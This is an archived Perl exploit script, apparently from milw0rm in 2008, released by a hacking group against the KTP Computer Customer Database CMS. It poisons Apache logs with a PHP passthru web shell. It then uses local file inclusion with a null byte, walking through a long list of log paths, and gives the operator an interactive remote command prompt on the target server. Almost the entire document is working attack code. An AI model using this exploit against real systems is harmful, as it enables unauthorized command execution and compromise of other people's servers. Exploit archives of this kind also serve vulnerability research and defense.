<html><head><title>KTP Computer Customer Database CMS Local File Inclusion Vulnerability</title></head><pre>#!/usr/bin/perl -w
#======================================
# KTPCCD Local File Inclusion Exploit
#======================================
#
#  ,--^----------,--------,-----,-------^--,
#  |  |||||||||   `--------'    |	   O	  .. CWH Underground Hacking Team ..
#  `+---------------------------^----------|
#   `\_,-------, _________________________|
#      / XXXXXX /`|     /
#     / XXXXXX /  `\   /
#    / XXXXXX /\______(
#   / XXXXXX /           
#  / XXXXXX /
# (________(             
#  `------'
#
#AUTHOR : CWH Underground
#DATE : 30 November 2008
#SITE : cwh.citec.us
#
#
#####################################################
#APPLICATION : KTP Computer Customer Database CMS
#VERSION : 1
#DOWNLOAD : http://downloads.sourceforge.net/ktpcomputercust/ktp_build_20081119.zip
######################################################
#Note: magic_quotes_gpc = off
#Vulnerability in Local File Inclusion
#Wrote Exploit for Local File Inclusion &lt;-&gt; Remote Command Execution
#######################################################################################
#Greetz      : ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos, Gdiupo, GnuKDE, JK
#Special Thx : asylu3, str0ke, citec.us, milw0rm.com
#######################################################################################


use LWP::UserAgent;
use IO::Socket;
use LWP::Simple;

$log=&quot;../&quot;;
@apache=(
&quot;../../../../../var/log/httpd/access_log&quot;,
&quot;../../../../../var/log/httpd/error_log&quot;,
&quot;../apache/logs/error.log&quot;,
&quot;../apache/logs/access.log&quot;,
&quot;../../apache/logs/error.log&quot;,
&quot;../../apache/logs/access.log&quot;,
&quot;../../../apache/logs/error.log&quot;,
&quot;../../../apache/logs/access.log&quot;,
&quot;../../../../apache/logs/error.log&quot;,
&quot;../../../../apache/logs/access.log&quot;,
&quot;../../../../../apache/logs/error.log&quot;,
&quot;../../../../../apache/logs/access.log&quot;,
&quot;../logs/error.log&quot;,
&quot;../logs/access.log&quot;,
&quot;../../logs/error.log&quot;,
&quot;../../logs/access.log&quot;,
&quot;../../../logs/error.log&quot;,
&quot;../../../logs/access.log&quot;,
&quot;../../../../logs/error.log&quot;,
&quot;../../../../logs/access.log&quot;,
&quot;../../../../../logs/error.log&quot;,
&quot;../../../../../logs/access.log&quot;,
&quot;../../../../../etc/httpd/logs/access_log&quot;,
&quot;../../../../../etc/httpd/logs/access.log&quot;,
&quot;../../../../../etc/httpd/logs/error_log&quot;,
&quot;../../../../../etc/httpd/logs/error.log&quot;,
&quot;../../.. /../../var/www/logs/access_log&quot;,
&quot;../../../../../var/www/logs/access.log&quot;,
&quot;../../../../../usr/local/apache/logs/access_log&quot;,
&quot;../../../../../usr/local/apache/logs/access.log&quot;,
&quot;../../../../../var/log/apache/access_log&quot;,
&quot;../../../../../var/log/apache/access.log&quot;,
&quot;../../../../../var/log/access_log&quot;,
&quot;../../../../../var/www/logs/error_log&quot;,
&quot;../../../../../var/www/logs/error.log&quot;,
&quot;../../../../../usr/local/apache/logs/error_log&quot;,
&quot;../../../../../usr/local/apache/logs/error.log&quot;,
&quot;../../../../../var/log/apache/error_log&quot;,
&quot;../../../../../var/log/apache/error.log&quot;,
&quot;../../../../../var/log/access_log&quot;,
&quot;../../../../../var/log/error_log&quot;
);

my $sis=&quot;$^O&quot;;if ($sis eq 'MSWin32') { system(&quot;cls&quot;); } else { system(&quot;clear&quot;); }

print &quot;\n==============================================\n&quot;;
print &quot;     KTP Computer Customer Database \n&quot;;
print &quot;    Remote Command Execution Exploit \n&quot;;
print &quot;      Discovered By CWH Underground \n&quot;;
print &quot;==============================================\n&quot;;
print &quot; \n&quot;;
print &quot; ,--^----------,--------,-----,-------^--, \n&quot;;
print &quot; | ||||||||| `--------' | O \n&quot;;
print &quot; `+---------------------------^----------| \n&quot;;
print &quot; `\_,-------, _________________________| \n&quot;;
print &quot; / XXXXXX /`| / \n&quot;;
print &quot; / XXXXXX / `\ / \n&quot;;
print &quot; / XXXXXX /\______( \n&quot;;
print &quot; / XXXXXX / \n&quot;;
print &quot; / XXXXXX / .. CWH Underground Hacking Team .. \n&quot;;
print &quot; (________( \n&quot;;
print &quot; `------' \n&quot;;
print &quot; \n&quot;;



if (@ARGV &lt; 2)
{
    print &quot;Usage: ./xpl.pl &lt;Host&gt; &lt;Path&gt;\n&quot;;
	print &quot;Ex. ./xpl.pl www.hackme.com /ktp\n&quot;;

}

$host=$ARGV[0];
$path=$ARGV[1];


if ( $host   =~   /^http:/ ) {$host =~ s/http:\/\///g;}

print &quot;\nTrying to Inject the Code...\n&quot;;

$CODE=&quot;&lt;? passthru(\$_GET[cmd]) ?&gt;&quot;;
$socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$host&quot;, PeerPort=&gt;&quot;80&quot;) or die &quot;Could not connect to host.\n\n&quot;;
print $socket &quot;GET /cwhunderground &quot;.$CODE.&quot; HTTP/1.1\r\n&quot;;
print $socket &quot;Host: &quot;.$host.&quot;\r\n&quot;;
print $socket &quot;Connection: close\r\n\r\n&quot;;
close($socket);

if ( $host   !~   /^http:/ ) {$host = &quot;http://&quot; . $host;}

 foreach $getlog(@apache)
                {
                  chomp($getlog);
				  $find= $host.$path.&quot;/?p=&quot;.$getlog.&quot;%00&quot;;
                  $xpl = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;;
				  $req = HTTP::Request-&gt;new(GET =&gt; $find);
				  $res = $xpl-&gt;request($req);
				  $info = $res-&gt;content;
                  if($info =~ /cwhunderground/)
                    {print &quot;\nSuccessfully injected in $getlog \n&quot;;$log=$getlog;}
                }


my $sis=&quot;$^O&quot;;if ($sis eq 'MSWin32') { print &quot;\n[cmd\@win32]\$ &quot;; } else { print &quot;\n[cmd\@unix]\$ &quot;; }

chomp( $cmd = &lt;STDIN&gt; );

while($cmd !~ &quot;exit&quot;) {   
   
				  $shell= $host.$path.&quot;/?p=&quot;.$log.&quot;%00&amp;cmd=$cmd&quot;;
                  $xpl = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;;
				  $req = HTTP::Request-&gt;new(GET =&gt; $shell);
				  $res = $xpl-&gt;request($req);
				  $info = $res-&gt;content;
				  print &quot;\n$info&quot;;

   
    my $sis=&quot;$^O&quot;;if ($sis eq 'MSWin32') { print &quot;\n[cmd\@win32]\$ &quot;; } else { print &quot;\n[cmd\@unix]\$ &quot;; }
    chomp( $cmd = &lt;STDIN&gt; );   
}

# milw0rm.com [2008-11-30]</pre></html>